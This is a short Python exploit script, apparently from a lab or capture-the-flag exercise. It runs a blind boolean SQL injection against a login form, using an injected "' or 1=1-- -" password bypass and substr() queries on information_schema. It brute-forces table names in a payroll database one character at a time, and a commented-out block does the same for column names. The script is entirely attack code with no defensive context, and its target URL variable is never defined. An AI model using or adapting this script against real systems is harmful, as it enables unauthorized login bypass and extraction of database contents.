#!/usr/bin/python3

import requests
import sys
import string
from pwn import *

CHARS=list(string.ascii_lowercase + string.digits + "-_")
SIZE=range(1, 100)

def make_exploit():
    database_name='payroll_db'
    table_name=''
    column_name=''
    # tables position, employee, department
    # columns in the table position id, 

    """
    data={
        "username":f"' or substr((select column_name from information_schema.columns where table_schema='{database_name}' and table_name='{table_name}' limit 7, 1), {position}, 1)='{char}'-- -", 
        "password":"' or 1=1-- -"
    }
    """

    p1 = log.progress("Performing SQLI ")
    for position in SIZE:
        for char in CHARS:
            data={
                "username":f"' or substr((select table_name from information_schema.tables where table_schema='{database_name}' limit 3, 1), {position}, 1)='{char}'-- -", 
                "password":"' or 1=1-- -"
            }
            response = requests.post(url=URL, data=data)
            if "1" in response.text: 
                table_name += char
                p1.status("table_name name: "+table_name)


def main():
    try:
        make_exploit()
    except Exception as e:
        print(str(e))
        sys.exit(1)
    except KeyboardInterrupt:
        print("\t\n\n Exiting...\n\n")


if __name__ == "__main__":
    main()

